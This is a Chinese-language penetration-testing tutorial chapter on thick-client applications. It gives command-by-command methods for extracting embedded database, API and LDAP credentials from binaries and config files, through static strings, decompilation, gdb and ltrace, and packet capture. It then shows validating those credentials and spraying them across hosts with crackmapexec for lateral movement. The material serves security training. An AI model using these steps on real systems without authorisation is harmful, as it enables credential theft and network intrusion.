# 第 54C 章 - 連接至服務的應用程式

## 學習目標

- 能從 ELF、DLL、JAR 或設定檔中找出連線字串、端點與憑證線索。
- 能用 strings、gdb、ILSpy/dnSpy 進行靜態與動態分析。
- 能把擷取到的憑證轉成後續橫向移動或服務驗證方向。
- 知道如何驗證提取的憑證是否真實可用。

---

## 理論基礎

```text
連接至服務的應用程式（Thick Client）：
  可能載體：Windows EXE/DLL（.NET 或 Native）、Linux ELF、Java JAR
  真正目標：不是破解應用本身，而是提取內嵌的服務連線能力

常見憑證藏匿位置：
  - 靜態字串（strings 可見）
  - 組態檔（config.ini / application.properties / web.config）
  - 加密後儲存（需執行後才明文）
  - 執行時拼接（動態分析才可見）

高價值連線資訊類型：
  - ODBC / SQLDriverConnect → 資料庫（SERVER= / UID= / PWD=）
  - JDBC → jdbc:sqlserver://HOST;user=X;password=Y
  - HTTP API 端點 → http://INTERNAL_HOST:PORT/api/endpoint
  - LDAP → ldap://DC_IP:389
  - FTP / SMB → 內部服務認證
```

## 方法一：靜態字串分析

```bash
# Linux ELF 二進位
strings TARGET_BINARY | grep -iE "password|passwd|pwd|server=|jdbc:|uid=|api|http|ldap|ftp"
# -i → 不分大小寫
# -E → 正規表達式
# 找包含憑證特徵的字串

# 更完整的字串過濾
strings TARGET_BINARY | grep -iE "server=.*uid=|password=|DSN=|Data Source="
# 找 ODBC 連線字串的典型格式

# Windows 可執行檔（在 Linux 分析）
strings -el TARGET.exe | grep -iE "password|server|jdbc"
# -el → 16-bit Little Endian 字串（Windows .NET 常用 Unicode）
# -e L → 等效寫法

# Java JAR 靜態分析
jar xf target.jar
# 解壓 JAR（和 zip 格式相同）

find . -name "*.properties" -o -name "*.xml" -o -name "*.yml" -o -name "*.cfg" | \
  xargs grep -liE "password|passwd|secret|credential" 2>/dev/null
# 找設定檔中的敏感資訊

# 反編譯 JAR（cfr）
java -jar cfr.jar target.jar --outputdir decompiled/
cd decompiled/
grep -rn "password\|passwd\|getConnection\|jdbc:" .
# getConnection → 資料庫連線呼叫
# jdbc: → JDBC 連線字串
```

## 方法二：.NET 應用分析（ILSpy / dnSpy）

```bash
# 在 Linux 上用 ILSpy CLI（ilspycmd）
ilspycmd target.dll -o /tmp/decompiled/
# 輸出反編譯的 C# 原始碼

# 搜尋連線字串
grep -rn "connectionString\|password\|SqlConnection\|SqlDataSource" /tmp/decompiled/
# SqlConnection → 資料庫連線
# connectionString → 直接含連線字串設定

# 搜尋 HTTP 端點
grep -rn "http://\|https://\|new Uri\|WebClient\|HttpClient" /tmp/decompiled/
# 找內部 API 端點

# web.config 分析（ASP.NET 應用）
cat web.config | grep -A 5 "connectionStrings\|appSettings"
# <connectionStrings> → 資料庫連線字串區段
# <appSettings> → 應用設定（常含 API 金鑰）

# 典型 web.config 連線字串格式
# <add name="DB" connectionString="Server=INTERNAL_HOST;Database=APP_DB;User Id=sa;Password=Password123;" />

# app.config（Windows 應用）
cat *.config | grep -iE "password|server|data source|uid"
```

## 方法三：動態分析（GDB 截取記憶體中的憑證）

```bash
# 對 Linux ELF 使用 gdb
gdb ./target_binary

# 在 GDB 中設中斷點（常見資料庫連線函式）
(gdb) break SQLDriverConnect
# 或
(gdb) break SQLConnect
(gdb) break PQconnectdb    # PostgreSQL
(gdb) break mysql_real_connect  # MySQL C library

(gdb) run
# 等程式執行到連線點

# 中斷後查看暫存器（x86_64：rdi=第1個參數，rsi=第2個參數）
(gdb) info registers
(gdb) x/s $rsi    # 查看第2個參數（通常是連線字串）
# 可能看到：SERVER=db.internal;UID=sa;PWD=Password123;

# 或在記憶體中搜尋字串
(gdb) find /b 0x400000, 0x7fffffffffff, 'P', 'W', 'D', '='
# 找記憶體中含 PWD= 的位置

# ltrace（追蹤函式呼叫，比 gdb 簡單）
ltrace -e SQLDriverConnect ./target_binary 2>&1 | grep -i "SQL\|connect\|password"
# -e → 只追蹤指定函式
# 函式參數會直接顯示

# strace（追蹤系統呼叫，看網路連線）
strace -e trace=network ./target_binary 2>&1 | grep -i "connect\|send"
# 看 connect() 呼叫的目標 IP 與埠
```

## 方法四：流量分析（Wireshark / tcpdump）

```bash
# 在執行應用程式時同時抓包
tcpdump -i lo -w /tmp/app_traffic.pcap &
./target_binary
kill %1

# 分析封包（用 strings 快速找明文憑證）
strings /tmp/app_traffic.pcap | grep -iE "password|user|login|auth"

# tcpdump 直接過濾（找資料庫流量）
tcpdump -i eth0 -A 'port 1433 or port 3306 or port 5432' 2>/dev/null | \
  grep -iE "password|user|login"
# 1433 → MSSQL、3306 → MySQL、5432 → PostgreSQL
# -A → ASCII 顯示封包內容（若未加密 → 明文可見）

# tshark 解析（Wireshark 命令列）
tshark -r /tmp/app_traffic.pcap -Y "http" -T fields -e http.request.uri -e http.authorization
# -Y → 過濾條件（http 流量）
# http.authorization → 含 Basic Auth 的 header（base64 解碼後是明文）
```

## 方法五：驗證提取的憑證

```bash
# 提取到 MSSQL 憑證 → 驗證
mssqlclient.py 'SERVER/USER:PASSWORD@TARGET_IP'
# 或
sqlcmd -S TARGET_IP -U USERNAME -P PASSWORD -Q "SELECT @@version"

# 提取到 MySQL 憑證 → 驗證
mysql -h TARGET_IP -u USERNAME -p'PASSWORD' -e "SELECT user();"

# 提取到 HTTP API 憑證 → 驗證
curl -s -u "USER:PASSWORD" http://INTERNAL_HOST:PORT/api/v1/users
# 或 Bearer Token
curl -s -H "Authorization: Bearer TOKEN" http://INTERNAL_HOST:PORT/api/

# 提取到 LDAP 憑證 → 驗證
ldapsearch -x -H ldap://DC_IP -D "CN=SERVICE_USER,DC=domain,DC=com" \
  -w "PASSWORD" -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# 密碼重複使用測試（常見！）
crackmapexec smb TARGET_RANGE -u USERNAME -p PASSWORD --continue-on-success
crackmapexec winrm TARGET_RANGE -u USERNAME -p PASSWORD
# 服務帳號常在多台主機使用同一密碼
```

## 決策流程

```
取得二進位（EXE / DLL / JAR / ELF）
    ↓
靜態分析（strings + grep）
  → 找到明文連線字串？→ 直接驗證
  → 找到加密字串？→ 進動態分析
    ↓
.NET DLL？
  → ilspycmd 反編譯 → 找 connectionString / API endpoint
Java JAR？
  → jar xf 解壓 → cfr 反編譯 → 找 JDBC / getConnection
原生 ELF？
  → gdb break SQLDriverConnect → run → 看 $rsi
  → ltrace -e SQLDriverConnect → 直接看參數
    ↓
取得憑證 / 端點
    ↓
驗證可用性（mssqlclient / mysql / curl / ldapsearch）
    ↓
密碼重複使用（crackmapexec SMB / WinRM 橫向測試）
```

## 速查表

```bash
# 靜態字串
strings TARGET | grep -iE "password|server=|jdbc:|uid=|api|http"
strings -el TARGET.exe | grep -iE "password|server"   # Unicode 字串

# JAR 分析
jar xf target.jar
grep -rn "password\|jdbc:" .
java -jar cfr.jar target.jar --outputdir /tmp/decompiled/

# .NET 反編譯
ilspycmd target.dll -o /tmp/decompiled/
grep -rn "connectionString\|password\|SqlConnection" /tmp/decompiled/

# 動態截取（gdb）
gdb ./binary
(gdb) break SQLDriverConnect
(gdb) run
(gdb) x/s $rsi

# ltrace
ltrace -e SQLDriverConnect ./binary 2>&1

# 驗證憑證
mssqlclient.py 'SERVER/USER:PASS@TARGET_IP'
mysql -h TARGET_IP -u USER -p'PASS'
crackmapexec smb TARGET_RANGE -u USER -p PASS
```

## 常見錯誤與排查

- 只做 strings，不做動態分析 — 執行時拼接的字串靜態看不到。
- 找到帳密後不驗證是否可用 — 可能是舊憑證或測試環境殘留。
- 忽略密碼重複使用 — 服務帳號幾乎都在多台主機用同一密碼。
- .NET 用 strings 分析 — 應該用 ilspycmd，strings 對 Unicode 字串效果差。
